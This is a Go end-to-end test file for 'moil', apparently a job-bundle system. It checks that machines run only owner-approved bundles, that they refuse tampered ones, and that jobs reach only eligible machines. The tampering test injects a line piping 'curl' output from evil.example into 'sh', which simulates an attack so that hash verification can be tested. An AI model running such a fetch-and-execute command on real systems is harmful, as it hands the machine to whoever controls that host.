package e2e

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"regexp"
	"strings"
	"sync/atomic"
	"testing"

	"git.convex.works/ConvexWorks/moil/sdk/go/moil"
)

// A machine runs only the bundles its owner approved. A job for another
// bundle waits, and the machine never even hears of it, though it takes
// the service's other jobs meanwhile. Once the owner has read the bundle
// and approved it, the waiting job runs.
func TestMachinesRunOnlyWhatTheirOwnerApproved(t *testing.T) {
	t.Parallel()
	svc := newService(t)
	echo := svc.publishEcho()
	m := newMachine(t, "alice-mac")
	m.Pair(svc, "alice")
	m.Approve(echo)
	m.Start()
	// The agent tells its owner about the bundle waiting for approval.
	hint := m.Logged("offers probe 1, which you haven't approved")

	waiting := svc.Submit(moil.Job{Params: probe(do.Result(nil))})
	// The machine takes the service's echo jobs meanwhile. The service
	// talks to it in order, so once it has run one it has heard all the
	// service had to say about the job before.
	succeed(t, svc.Submit(moil.Job{Bundle: echo, Params: map[string]any{"text": "hi"}}))
	if m.link.Heard(waiting.ID()) || waiting.State() != moil.Queued {
		t.Fatalf("the job for a bundle the owner never approved reached the machine; it is %s", waiting.State())
	}

	// The owner does as the agent said: stops it, runs the command it
	// gave, reads the bundle in full and approves it. Then they start the
	// agent again.
	command := regexp.MustCompile("stop the agent and run `moil ([^`]+)`").FindStringSubmatch(hint)
	if command == nil {
		t.Fatalf("the agent didn't say how to approve the bundle: %s", hint)
	}
	m.Stop()
	review, stderr, err := m.tryAnswering("y\n", strings.Fields(command[1])...)
	if err != nil {
		t.Fatalf("moil %s: %v\n%s", command[1], err, stderr)
	}
	for _, want := range []string{
		"Status: not approved",
		"Hash: " + svc.probe.Hash(),
		string(svc.probe.File(moil.ScriptFile)),
		string(svc.probe.File(moil.LockFile)),
		string(svc.probe.File(moil.ManifestFile)),
		"Approved: " + svc.probe.Hash(),
	} {
		if !strings.Contains(review, want) {
			t.Fatalf("moil %s didn't show %q:\n%s", command[1], want, review)
		}
	}
	m.Start()
	if res := succeed(t, waiting); res.Machine != m.ID() {
		t.Errorf("the job ran on %s, not on alice's machine %s", res.Machine, m.ID())
	}
}

// Whatever a service, or someone between it and the machine, does to a
// bundle, the machine checks what it receives against the hash its owner
// is asked to approve. A tampered bundle can be neither reviewed nor
// approved, and so never runs.
func TestTamperedBundlesAreRefused(t *testing.T) {
	t.Parallel()
	probeHash := loadProbe(t).Hash()
	var tampered atomic.Int32
	svc := newService(t, withMiddleware(func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path != "/v1/bundles/"+probeHash {
				next.ServeHTTP(w, r)
				return
			}
			var bundle struct {
				Hash  string            `json:"hash"`
				Files map[string]string `json:"files"`
			}
			sent := httptest.NewRecorder()
			next.ServeHTTP(sent, r)
			if err := json.Unmarshal(sent.Body.Bytes(), &bundle); err != nil {
				t.Errorf("the service sent a bundle that isn't JSON: %v", err)
			}
			bundle.Files[moil.ScriptFile] += "\nimport os; os.system('curl -s https://evil.example | sh')\n"
			tampered.Add(1)
			json.NewEncoder(w).Encode(bundle)
		})
	}))
	echo := svc.publishEcho()
	m := newMachine(t, "alice-mac")
	m.Pair(svc, "alice")

	for _, command := range [][]string{
		{"review", m.serviceID, probeHash},
		{"approve", m.serviceID, probeHash, "--yes"},
	} {
		stdout, stderr, err := m.try(command...)
		if err == nil || !strings.Contains(stderr, "the bundle hashes to") {
			t.Errorf("moil %s didn't refuse the tampered bundle: %v\n%s", command[0], err, stderr)
		}
		if strings.Contains(stdout, "evil.example") {
			t.Errorf("moil %s showed the tampered script:\n%s", command[0], stdout)
		}
	}
	if n := tampered.Load(); n != 2 {
		t.Fatalf("the bundle was tampered with %d times, want once per command", n)
	}

	// The owner approves the untouched echo bundle and lends the machine.
	// It reports no other approval, and never hears of the probe's job.
	m.Approve(echo)
	m.Start()
	if approved := svc.Machine(m.ID()).Approved; len(approved) != 1 || approved[0] != echo.Hash() {
		t.Fatalf("the machine reports approving %v, want only echo %s", approved, echo.Hash())
	}
	waiting := svc.Submit(moil.Job{Params: probe(do.Result(nil))})
	succeed(t, svc.Submit(moil.Job{Bundle: echo, Params: map[string]any{"text": "hi"}}))
	if m.link.Heard(waiting.ID()) || waiting.State() != moil.Queued {
		t.Fatalf("a job for the tampered bundle reached the machine; it is %s", waiting.State())
	}
}

// A service decides who may run a job: here, only machines of the owner
// of the meeting it transcribes. Another user's machine never hears of
// the job, even while idle, approved, and preferred by the service.
func TestJobsGoOnlyToEligibleMachines(t *testing.T) {
	t.Parallel()
	svc := newService(t)
	alice, bob := newMachine(t, "alice-mac"), newMachine(t, "bob-mac")
	for owner, m := range map[string]*machine{"alice": alice, "bob": bob} {
		m.Pair(svc, owner)
		m.Approve(svc.probe)
		m.Start()
	}
	preferBob := func(m moil.Machine) int {
		if m.Owner == "bob" {
			return 1
		}
		return 0
	}

	meeting := svc.Submit(moil.Job{Params: probe(do.Result(nil)), Eligible: moil.OwnedBy("alice"), Prefer: preferBob})
	if res := succeed(t, meeting); res.Machine != alice.ID() {
		t.Errorf("alice's meeting ran on %s, not on her machine %s", res.Machine, alice.ID())
	}

	// A job anyone may run goes to bob's machine, as preferred: it was
	// ready all along. Once bob's machine has heard of this job, it has
	// heard everything the service sent it before.
	public := svc.Submit(moil.Job{Params: probe(do.Result(nil)), Prefer: preferBob})
	if res := succeed(t, public); res.Machine != bob.ID() {
		t.Errorf("the job anyone may run ran on %s, not on bob's preferred machine %s", res.Machine, bob.ID())
	}
	if bob.link.Heard(meeting.ID()) {
		t.Error("bob's machine heard of alice's meeting")
	}
	if !alice.link.Heard(meeting.ID()) || !bob.link.Heard(public.ID()) {
		t.Error("the machines didn't hear of the jobs they ran")
	}
}

// publishEcho publishes the example echo bundle, a second bundle besides
// the probe.
func (s *service) publishEcho() *moil.Bundle {
	s.t.Helper()
	echo, err := moil.LoadBundle(os.DirFS("../examples/bundles/echo"))
	if err != nil {
		s.t.Fatal(err)
	}
	s.sdk.AddBundle(echo)
	return echo
}
